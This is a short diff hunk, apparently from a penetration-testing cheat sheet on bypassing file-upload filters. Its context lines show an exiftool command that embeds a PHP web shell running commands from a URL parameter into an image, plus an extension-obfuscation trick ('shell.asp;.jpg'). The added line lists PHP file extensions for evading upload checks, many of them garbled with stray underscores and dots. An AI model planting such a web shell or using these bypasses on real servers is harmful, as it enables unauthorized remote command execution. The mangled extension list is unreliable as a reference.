@@ -35,7 +35,7 @@ exiftool -Comment="<?php system($_GET['cmd']); ?>" <YOUR-INPUT-IMAGE>.jpg -o she
 
 ```
 #Modify the original extension
-PHP: phps, pHp, php7, phtml.
+PHP: .php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
 
 #Obfuscate the extension
 1. shell.asp;.jpg
